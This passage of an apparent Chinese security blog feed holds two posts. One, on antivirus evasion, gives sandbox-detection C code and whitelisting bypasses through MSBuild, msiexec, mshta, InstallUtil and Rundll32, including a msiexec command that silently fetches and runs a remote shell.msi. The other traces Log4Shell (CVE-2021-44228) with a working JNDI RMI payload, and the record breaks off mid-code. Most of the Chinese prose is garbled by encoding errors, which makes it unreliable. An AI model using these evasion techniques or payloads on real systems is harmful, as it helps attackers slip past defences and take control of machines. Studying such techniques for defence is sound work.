= pe.th32ParentProcessID;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (<span class="built_in">Process32Next</span>(hkz, &amp;pe));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ParentProcessID;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">get_explorer_processid</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    DWORD explorer_id = <span class="number">-1</span>;</span><br><span class="line">    PROCESSENTRY32 pe;</span><br><span class="line">    HANDLE hkz;</span><br><span class="line">    HMODULE hModule = <span class="built_in">LoadLibrary</span>(_T(<span class="string">&quot;Kernel32.dll&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hModule == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">OutputDebugString</span>(_T(<span class="string">&quot;Loaddll error&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    FARPROC Address = <span class="built_in">GetProcAddress</span>(hModule, <span class="string">&quot;CreateToolhelp32Snapshot&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (Address == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">OutputDebugString</span>(_T(<span class="string">&quot;GetProc error&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    _asm &#123;</span><br><span class="line">        push <span class="number">0</span></span><br><span class="line">        push <span class="number">2</span></span><br><span class="line">        call Address</span><br><span class="line">    mov hkz, eax</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">pe.dwSize = <span class="built_in">sizeof</span>(PROCESSENTRY32);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">Process32First</span>(hkz, &amp;pe)) &#123;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (_wcsicmp(pe.szExeFile, <span class="string">L&quot;explorer.exe&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            explorer_id = pe.th32ProcessID;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (<span class="built_in">Process32Next</span>(hkz, &amp;pe));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> explorer_id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    DWORD explorer_id = <span class="built_in">get_explorer_processid</span>();</span><br><span class="line">    DWORD parent_id = <span class="built_in">get_parent_processid</span>(<span class="built_in">GetCurrentProcessId</span>());</span><br><span class="line">    <span class="keyword">if</span> (explorer_id == parent_id) </span><br><span class="line">    &#123; <span class="comment">/* åˆ¤æ–­çˆ¶è¿›ç¨‹idæ˜¯å¦å’Œexplorerè¿›ç¨‹idç›¸åŒ&#123; */</span></span><br><span class="line">        <span class="built_in">MessageBox</span>(<span class="number">0</span>, <span class="string">L&quot;Not sandbox&quot;</span>, <span class="string">L&quot;Success&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="äºŒå¼€csç¯å¢ƒå‡†å¤‡"><a href="#äºŒå¼€csç¯å¢ƒå‡†å¤‡" class="headerlink" title="äºŒå¼€csç¯å¢ƒå‡†å¤‡"></a>äºŒå¼€csç¯å¢ƒå‡†å¤‡</h2><p>å‚è€ƒ:</p><p><a href="https://www.ol4three.com/2021/11/09/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/CobaltStrike/CobaltStrike%E4%BA%8C%E5%BC%80%E7%8E%AF%E5%A2%83%E5%88%9D%E6%8E%A2/">https://www.ol4three.com/2021/11/09/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/CobaltStrike/CobaltStrike%E4%BA%8C%E5%BC%80%E7%8E%AF%E5%A2%83%E5%88%9D%E6%8E%A2/</a></p><h2 id="ç™½åå•"><a href="#ç™½åå•" class="headerlink" title="ç™½åå•"></a>ç™½åå•</h2><h3 id="ä¸€ã€MSBuild-exeä»‹ç»"><a href="#ä¸€ã€MSBuild-exeä»‹ç»" class="headerlink" title="ä¸€ã€MSBuild.exeä»‹ç»"></a>ä¸€ã€MSBuild.exeä»‹ç»</h3><p>Microsoft Build Engineæ˜¯ä¸€ä¸ªç”¨äºæ„å»ºåº”ç”¨ç¨‹åºçš„å¹³å°ï¼Œæ­¤å¼•æ“ä¹Ÿè¢«ç§°ä¸ºmsbuildï¼Œå®ƒä¸ºé¡¹ç›®æ–‡ä»¶æä¾›ä¸€ä¸ªXMLæ¨¡å¼ï¼Œè¯¥æ¨¡å¼æ§åˆ¶æ„å»ºå¹³å°å¦‚ä½•å¤„ç†å’Œæ„å»ºè½¯ä»¶ã€‚Visual Studioä½¿ç”¨MSBuildï¼Œä½†å®ƒä¸ä¾èµ–äºVisual Studioã€‚é€šè¿‡åœ¨é¡¹ç›®æˆ–è§£å†³æ–¹æ¡ˆæ–‡ä»¶ä¸­è°ƒç”¨msbuild.exeï¼Œå¯ä»¥åœ¨æœªå®‰è£…Visual Studioçš„ç¯å¢ƒä¸­ç¼–è¯‘å’Œç”Ÿæˆç¨‹åºã€‚</p><p>è¯´æ˜ï¼šMsbuild.exeæ‰€åœ¨è·¯å¾„æ²¡æœ‰è¢«ç³»ç»Ÿæ·»åŠ PATHç¯å¢ƒå˜é‡ä¸­ï¼Œå› æ­¤ï¼ŒMsbuildå‘½ä»¤æ— æ³•ç›´æ¥åœ¨cmdä¸­ä½¿ç”¨ã€‚éœ€è¦å¸¦ä¸Šè·¯å¾„ï¼šC:\Windows\Microsoft.NET\Framework\v4.0.30319ã€‚</p><p>é€‚ç”¨æ¡ä»¶:.NET Framework&gt;&#x3D;4.0</p><p>xmlé…ç½®æ–‡ä»¶å†™æ³•ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p><a href="https://www.cnblogs.com/LyShark/p/11331476.html">https://www.cnblogs.com/LyShark/p/11331476.html</a></p><p><a href="https://micro8.gitbook.io/micro8/contents-1/71-80/71-ji-yu-bai-ming-dan-msbuild.exe-zhi-hang-payload-di-yi-ji">https://micro8.gitbook.io/micro8/contents-1/71-80/71-ji-yu-bai-ming-dan-msbuild.exe-zhi-hang-payload-di-yi-ji</a></p><p><a href="https://pplsec.github.io/2019/03/26/MSBuild.exe-bypass-application-whitelisting/">https://pplsec.github.io/2019/03/26/MSBuild.exe-bypass-application-whitelisting/</a></p><p><a href="http://wiki.tidesec.com/docs/bypassav">http://wiki.tidesec.com/docs/bypassav</a></p><p><a href="https://www.freebuf.com/articles/network/197706.html">https://www.freebuf.com/articles/network/197706.html</a></p><h3 id="äºŒã€msiexec-exeä»‹ç»"><a href="#äºŒã€msiexec-exeä»‹ç»" class="headerlink" title="äºŒã€msiexec.exeä»‹ç»"></a>äºŒã€msiexec.exeä»‹ç»</h3><p>çœ‹åˆ°msiexecå¯èƒ½è¿˜æœ‰ç‚¹é™Œç”Ÿï¼Œä½†è¯´é“.msiå¯èƒ½å°±æ¯”è¾ƒç†Ÿæ‚‰äº†ï¼Œåœ¨windowsä¸‹å¾ˆå¤šè½¯ä»¶å®‰è£…å°±æ˜¯.msiæ ¼å¼çš„ã€‚å½“Windowsæ“ä½œç³»ç»Ÿå®‰è£…äº†Windows Installerå¼•æ“ï¼Œè€ŒMSIè½¯ä»¶åŒ…ä½¿ç”¨è¯¥å¼•æ“æ¥ å®‰è£…åº”ç”¨ç¨‹åºï¼Œè§£é‡ŠåŒ…å’Œå®‰è£…äº§å“çš„å¯æ‰§è¡Œç¨‹åºå°±æ˜¯æˆ‘ä»¬è¿™ç”¨åˆ° çš„Msiexec.exeã€‚</p><p>ä¹‹å‰åœ¨ä»‹ç»å…æ€å·¥å…·çš„æ—¶å€™æœ‰äº›å·¥å…·å°±å¯ä»¥ç”Ÿæˆmsiæ ¼å¼çš„payloadï¼Œæ¯”å¦‚ä¸“é¢˜6ä»‹ç»çš„venomï¼š<a href="https://mp.weixin.qq.com/s/CbfxupSWEPB86tBZsmxNCQ,%E5%85%B6%E5%AE%9Emsfvenom%E4%B9%9F%E5%8F%AF%E4%BB%A5%E7%94%9F%E6%88%90msi%E6%A0%BC%E5%BC%8F%E7%9A%84payload%EF%BC%8C%E4%B8%8D%E8%BF%87%E8%A2%AB%E6%9D%80%E8%BD%AF%E6%9F%A5%E6%9D%80%E7%9A%84%E6%AF%94%E8%BE%83%E5%8E%89%E5%AE%B3%E4%BA%86%E3%80%82">https://mp.weixin.qq.com/s/CbfxupSWEPB86tBZsmxNCQ,å…¶å®msfvenomä¹Ÿå¯ä»¥ç”Ÿæˆmsiæ ¼å¼çš„payloadï¼Œä¸è¿‡è¢«æ€è½¯æŸ¥æ€çš„æ¯”è¾ƒå‰å®³äº†ã€‚</a></p><p>msiæ–‡ä»¶å¯ä»¥åŒå‡»æ‰§è¡Œï¼Œä¹Ÿå¯ä»¥å‘½ä»¤è¡Œé™é»˜æ‰§è¡Œï¼Œè€Œä¸”msiexecä¹ŸåŒæ ·æ”¯æŒè¿œç¨‹ä¸‹è½½åŠŸèƒ½ï¼Œå°†msiæ–‡ä»¶ä¸Šä¼ åˆ°æœåŠ¡å™¨ï¼Œé€šè¿‡å¦‚ä¸‹å‘½ä»¤è¿œç¨‹æ‰§è¡Œï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msiexec /q /i http://www.tidesec.com/shell/shell.msi</span><br></pre></td></tr></table></figure><p>å‚è€ƒï¼š<a href="https://www.cnblogs.com/backlion/p/10493910.html">https://www.cnblogs.com/backlion/p/10493910.html</a></p><p><a href="http://wiki.tidesec.com/docs/bypassav">http://wiki.tidesec.com/docs/bypassav</a></p><h3 id="ä¸‰ã€Mshta-exeä»‹ç»"><a href="#ä¸‰ã€Mshta-exeä»‹ç»" class="headerlink" title="ä¸‰ã€Mshta.exeä»‹ç»"></a>ä¸‰ã€Mshta.exeä»‹ç»</h3><p><font style="color:rgb(36, 41, 46);">Mshta.exeæ˜¯å¾®è½¯Windowsæ“ä½œç³»ç»Ÿç›¸å…³ç¨‹åºï¼Œè‹±æ–‡å…¨ç§°Microsoft HTML Applicationï¼Œå¯ç¿»è¯‘ä¸ºå¾®è½¯è¶…æ–‡æœ¬æ ‡è®°è¯­è¨€åº”ç”¨ï¼Œç”¨äºæ‰§è¡Œ.HTAæ–‡ä»¶ã€‚<br></font><font style="color:rgb(36, 41, 46);">ç›®å‰æ­£å¸¸çš„htaæ–‡ä»¶ç”¨åˆ°çš„å¾ˆå°‘ï¼Œå¶å°”è§åˆ°äº†å¾ˆå¯èƒ½å°±æ˜¯æ¶æ„è½¯ä»¶ï¼Œå¾ˆå¤šå…æ€å·¥å…·éƒ½æ˜¯å¯¹shellcodeè¿›è¡Œå¤„ç†åç”Ÿäº§.htaæ–‡ä»¶ï¼Œåœ¨windowsä¸‹å¯ä»¥ç›´æ¥æ‰§è¡Œã€‚<br></font>ä¹‹å‰å·¥å…·ç¯‡é‡Œå¤šä¸ªå·¥å…·éƒ½å¯ä»¥ç”Ÿæˆhtaåé—¨ï¼š</p><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://www.cnblogs.com/backlion/p/10491616.html">https://www.cnblogs.com/backlion/p/10491616.html</a>ï¼ˆå¤šç§æ–¹æ³•ï¼‰</p><h3 id="å››ã€InstallUtil-exeä»‹ç»"><a href="#å››ã€InstallUtil-exeä»‹ç»" class="headerlink" title="å››ã€InstallUtil.exeä»‹ç»"></a>å››ã€InstallUtil.exeä»‹ç»</h3><p>InstallUtil.exeç®—æ˜¯å…æ€ç™½åå•é‡Œä½¿ç”¨æ¯”è¾ƒå¤šçš„ä¸€ä¸ªäº†ï¼ŒInstallUtil.exeå¯ä»¥ç”¨äºå®‰è£…æœ‰.NETå¼€å‘çš„æ‰€æœ‰åº”ç”¨å®‰è£…ç¨‹åºï¼Œå¦‚æœè¦ä½¿ç”¨ .NET Framework å¼€å‘ Windows æœåŠ¡ï¼Œåˆ™å¯ä»¥ä½¿ç”¨installutil.exeå‘½ä»¤è¡Œå¿«é€Ÿå®‰è£…æœåŠ¡åº”ç”¨ç¨‹åºã€‚</p><p>åˆ©ç”¨è¿‡ç¨‹å‚è€ƒï¼š</p><p><a href="https://pplsec.github.io/2019/03/26/InstallUtil&csc.exe-bypass-application-whitelisting/">https://pplsec.github.io/2019/03/26/InstallUtil&csc.exe-bypass-application-whitelisting/</a></p><p><a href="http://wiki.tidesec.com/docs/bypassav">http://wiki.tidesec.com/docs/bypassav</a>ï¼ˆä¸“é¢˜36ï¼‰</p><h3 id="äº”ã€Rundll32-exeä»‹ç»"><a href="#äº”ã€Rundll32-exeä»‹ç»" class="headerlink" title="äº”ã€Rundll32.exeä»‹ç»"></a>äº”ã€Rundll32.exeä»‹ç»</h3><p>Rundll32.exeï¼Œå¯ä»¥æ‰§è¡Œ32ä½çš„DLLæ–‡ä»¶ï¼Œä»¥å‘½ä»¤è¡Œçš„æ–¹å¼è°ƒç”¨åŠ¨æ€é“¾æ¥ç¨‹åºåº“ã€‚ã€‚å®ƒçš„ä½œç”¨æ˜¯æ‰§è¡ŒDLLæ–‡ä»¶ä¸­çš„å†…éƒ¨å‡½æ•°ï¼Œè¿™æ ·åœ¨è¿›ç¨‹å½“ä¸­ï¼Œåªä¼šæœ‰Rundll32.exeï¼Œè€Œä¸ä¼šæœ‰DLLåé—¨çš„è¿›ç¨‹ï¼Œè¿™æ ·å°±å®ç°äº†è¿›ç¨‹ä¸Šçš„éšè—ã€‚ç³»ç»Ÿä¸­è¿˜æœ‰ä¸€ä¸ªRundll.exeæ–‡ä»¶ï¼Œå¯ä»¥æ‰§è¡Œ16ä½çš„DLLæ–‡ä»¶ã€‚</p><p>DLLæ–‡ä»¶å¯¹äºWindowçš„æ“ä½œç³»ç»Ÿéå¸¸é‡è¦ï¼Œå®ƒè¿˜å†³å®šäº†è‡ªå®šä¹‰Windowsçš„å…¶ä»–ç¨‹åºçš„è¿è¡Œã€‚åŠ¨æ€é“¾æ¥åº“ï¼ˆDLLï¼‰æ–‡ä»¶æ˜¯ä¸€ç§æ–‡ä»¶ç±»å‹ï¼Œå®ƒå‘å…¶ä»–ç¨‹åºæä¾›æœ‰å…³å¦‚ä½•è°ƒç”¨æŸäº›å†…å®¹çš„æŒ‡ä»¤ã€‚å› æ­¤ï¼Œå¤šä¸ªè½¯ä»¶ç”šè‡³å¯ä»¥åŒæ—¶å…±äº«è¿™æ ·çš„DLLæ–‡ä»¶ã€‚å°½ç®¡ä¸.exeæ–‡ä»¶çš„æ ¼å¼ç›¸åŒ,ä½†DLLæ–‡ä»¶ä¸èƒ½åƒ.exeæ–‡ä»¶é‚£æ ·ç›´æ¥æ‰§è¡Œã€‚dllæ–‡ä»¶æ‰©å±•åå¯ä»¥æ˜¯ï¼š.dllï¼ˆåŠ¨æ€é“¾æ¥åº“ï¼‰ã€.ocxï¼ˆActiveXæ§ä»¶ï¼‰ã€.cplï¼ˆæ§åˆ¶é¢æ¿ï¼‰ã€.drvï¼ˆè®¾å¤‡é©±åŠ¨ç¨‹åºï¼‰ã€‚</p><p>Rundll32.exeä»¤è¡Œä¸‹çš„ä½¿ç”¨æ–¹æ³•ä¸ºï¼šRundll32.exe DLLname,Functionname,éœ€æ³¨æ„x86ï¼Œx64ä½çš„Rundll32è°ƒç”¨ï¼Œ64ä½çš„ç³»ç»Ÿé»˜è®¤è°ƒç”¨çš„æ˜¯64ä½Rundll32.exe(åœ¨C:\Windows\System32ç›®å½•ä¸‹)ã€‚</p><p>Windows 7 é»˜è®¤ä½ç½®ï¼š</p><p>64ä½ C:\Windows\System32\rundll32.exe </p><p>32ä½ C:\Windows\SysWOW64\rundll32.exe</p><p>åˆ©ç”¨æ–¹å¼å¯ä»¥å‚è€ƒï¼š</p><p><a href="https://www.cnblogs.com/backlion/p/10488747.html">https://www.cnblogs.com/backlion/p/10488747.html</a></p>]]></content>
      
      
      <categories>
          
          <category> æ”»é˜²æ¸—é€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å…æ€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Log4jååºåˆ—åŒ–</title>
      <link href="/2024/12/30/Java%E5%AE%89%E5%85%A8/Log4j%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2024/12/30/Java%E5%AE%89%E5%85%A8/Log4j%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h2 id="CVE-2021-44228"><a href="#CVE-2021-44228" class="headerlink" title="CVE-2021-44228"></a>CVE-2021-44228</h2><h3 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">2.14</span><span class="number">.1</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;log4j-api&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">2.14</span><span class="number">.1</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Level;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.core.LoggerContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.core.config.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.core.config.LoggerConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Log4j_vul</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger(Log4j_vul.class);</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">LoggerContext</span> <span class="variable">ctx</span>          <span class="operator">=</span> (LoggerContext) LogManager.getContext(<span class="literal">false</span>);</span><br><span class="line">        <span class="type">Configuration</span> <span class="variable">config</span>       <span class="operator">=</span> ctx.getConfiguration();</span><br><span class="line">        <span class="type">LoggerConfig</span> <span class="variable">loggerConfig</span> <span class="operator">=</span> config.getLoggerConfig(LogManager.ROOT_LOGGER_NAME);</span><br><span class="line">        loggerConfig.setLevel(Level.ALL);</span><br><span class="line">        ctx.updateLoggers();</span><br><span class="line">        <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> <span class="string">&quot;$&#123;jndi:rmi://10.169.5.252:1099/mad9ab&#125;&quot;</span>;</span><br><span class="line">        logger.info(message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¯´ä¸€å˜´è¿™é‡Œå…¶å®ç”¨info &#x2F;error&#x2F; warnæ–¹æ³•éƒ½æ˜¯å¯ä»¥è§¦å‘æ¼æ´çš„åªä¸è¿‡ä»–ä»¬ä¸‰ä¸ªæ–¹æ³•ä¸ªå­—å¯¹åº”çš„æ—¥å¿—çº§åˆ«ä¸ä¸€æ ·ã€‚</p><h3 id="è°ƒç”¨é“¾"><a href="#è°ƒç”¨é“¾" class="headerlink" title="è°ƒç”¨é“¾"></a>è°ƒç”¨é“¾</h3><p>ç”±äºååŠéƒ¨åˆ†æ˜¯ç”±äºjndiæ¼æ´é€ æˆçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆå°†æ–­ç‚¹ä¸‹åœ¨InitialContextç±»çš„lookupæ–¹æ³•è¿™é‡Œç„¶åå›çœ‹è°ƒç”¨æ ˆã€‚</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733839795568-08d8c1e8-c11b-4c66-960e-f65b2cd58de0.png"></p><p>è¿™é‡Œå…ˆç»™å‡ºè°ƒç”¨æ ˆï¼Œç„¶åæˆ‘ä»¬é€æ­¥åˆ†æä¸€ä¸‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733839825467-f951bc28-7bed-4b61-b529-1bd469c67d7a.png"></p><p>è¿™é‡Œä¼šè·Ÿè¿›logIfEnabledæ–¹æ³•é‡Œè·Ÿè¿›å»</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733839846909-007c579e-eee1-48c9-832c-b92420eabd02.png"></p><p>è¿™é‡Œä¼šä¼ å…¥æˆ‘ä»¬å®šä¹‰çš„æ—¥å¿—ä¿¡æ¯è¿˜æœ‰æ—¥å¿—ç­‰çº§ç­‰æˆ‘ä»¬è¿™é‡Œçš„ç­‰çº§æ˜¯INFOï¼Œç»§ç»­å‘ä¸‹è·Ÿè¿›å»logMessageæ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733839967779-d246cb0c-05ac-49f1-a75a-ce9b54ece585.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733840038961-c710b439-aec7-4962-87b3-10d527d9f6c3.png"></p><p>å¯ä»¥çœ‹åˆ°ä½¿ç”¨messageFactoryå¯¹è±¡åˆ›å»ºä¸€ä¸ªmessageå¯¹è±¡è¿™é‡Œé¢åŒ…å«çš„å…¶å®è¿˜æ˜¯æˆ‘ä»¬ä¼ å…¥çš„æ—¥å¿—ä¿¡æ¯ç»§ç»­å‘ä¸‹è·Ÿ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733840065085-dfbc130a-0240-4d42-bda3-28ae39a0709a.png"></p><p>æ²¡å•¥é€»è¾‘è·Ÿè¿›å»</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733840085492-bc7cab09-576c-4544-b62a-63e0df81b517.png"></p><p>è¿™é‡Œä¹Ÿæ²¡ä»€ä¹ˆä¸œè¥¿ä¹Ÿç»§ç»­è·Ÿè¿›</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733840131130-a7016a0b-819c-4df6-b60a-64233fa06bf8.png"></p><p>è¿™é‡Œä¹Ÿæ˜¯æ²¡å•¥è¯´çš„åé¢ä¼šè°ƒç”¨è¿‡ä¸ªlogæ–¹æ³•æˆ‘ä»¬ç›´æ¥ç•¥è¿‡è·Ÿåˆ°å…³é”®éƒ¨åˆ†</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733840238870-c76eae13-fa7f-4056-a583-3cbbc6bb3821.png"></p><p>è·Ÿåˆ°PatternLayoutç±»çš„toSerializeæ–¹æ³•é‡Œåœ¨è¿™é‡Œæœ‰ä¸€ä¸ªforå¾ªç¯ï¼Œåœ¨å¾ªç¯åˆ°ç¬¬8æ¬¡çš„æ—¶å€™ä¼šå¾—åˆ°MessagePatternConverterå¯¹è±¡ï¼Œè°ƒç”¨å…¶formatæ–¹æ³•è·Ÿåˆ°é‡Œé¢çœ‹çœ‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733840352345-d8ae058e-2986-4e87-a910-40f1a15fa62d.png"></p><p>è¿™é‡Œçš„converteræ˜¯MessagePatternConverterç»§ç»­è·Ÿè¿›</p><p>è¿™é‡Œæˆ‘å°±ç›´æ¥å¼•ç”¨å¸ˆå“¥çš„è§£é‡Š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">format</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> StringBuilder toAppendTo)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="type">Message</span> <span class="variable">msg</span> <span class="operator">=</span> event.getMessage();</span><br><span class="line">    <span class="comment">// å¦‚æœmsgå®ç°äº†StringBuilderFormattableæ¥å£ï¼Œè¿›å…¥è¿™é‡Œ</span></span><br><span class="line">    <span class="keyword">if</span> (msg <span class="keyword">instanceof</span> StringBuilderFormattable) &#123;</span><br><span class="line">        <span class="comment">// textRendererä¸ºnullï¼Œè¿™é‡Œç›´æ¥ä¸ºtoAppendTo</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">doRender</span> <span class="operator">=</span> textRenderer != <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">StringBuilder</span> <span class="variable">workingBuilder</span> <span class="operator">=</span> doRender ? <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="number">80</span>) : toAppendTo;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è·å–åˆå§‹é•¿åº¦ä½œä¸ºåç§»é‡</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">offset</span> <span class="operator">=</span> workingBuilder.length();</span><br><span class="line">        <span class="comment">// å¦‚æœmsgå®ç°äº†MultiFormatStringBuilderFormattableæ¥å£</span></span><br><span class="line">        <span class="comment">// ä¸ç®¡è¿›å…¥å“ªä¸ªåˆ†æ”¯ï¼Œéƒ½éœ€è¦è¿›è¡ŒformatToæ–¹æ³•è¿›è¡Œæ ¼å¼åŒ–ï¼Œä½œç”¨æ˜¯å°†æ ¼å¼åŒ–çš„å†…å®¹æ·»åŠ åˆ°workingBuilderä¸­</span></span><br><span class="line">        <span class="keyword">if</span> (msg <span class="keyword">instanceof</span> MultiFormatStringBuilderFormattable) &#123;</span><br><span class="line">            ((MultiFormatStringBuilderFormattable) msg).formatTo(formats, workingBuilder);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// è¿›å…¥è¿™é‡Œ</span></span><br><span class="line">            ((StringBuilderFormattable) msg).formatTo(workingBuilder);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// TODO can we optimize 